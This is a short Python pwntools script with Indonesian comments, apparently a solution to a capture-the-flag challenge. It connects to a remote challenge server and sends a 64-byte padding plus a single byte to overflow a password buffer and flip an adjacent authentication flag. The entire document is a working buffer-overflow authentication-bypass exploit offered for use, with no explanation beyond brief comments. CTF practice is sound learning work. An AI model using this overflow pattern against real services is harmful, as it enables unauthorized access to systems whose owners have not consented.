#!/usr/bin/env python3
from pwn import *

# Koneksi ke server
host = 'ctf-chall.stembascc.com'
port = 5203

# Uncomment salah satu:
conn = remote(host, port)  # Untuk remote
# conn = process('./chall')  # Untuk testing lokal

# Menerima banner
print(conn.recvuntil(b'password terlebih dahulu:\n').decode())

# Payload:
# - 64 byte untuk mengisi buffer inputPass
# - 4 byte (atau 1 byte) untuk overwrite authenticationOpen menjadi non-zero
payload = b'A' * 64 + b'\x01'

# Kirim payload
conn.sendline(payload)

# Terima response
response = conn.recvall(timeout=2).decode()
print(response)

conn.close()
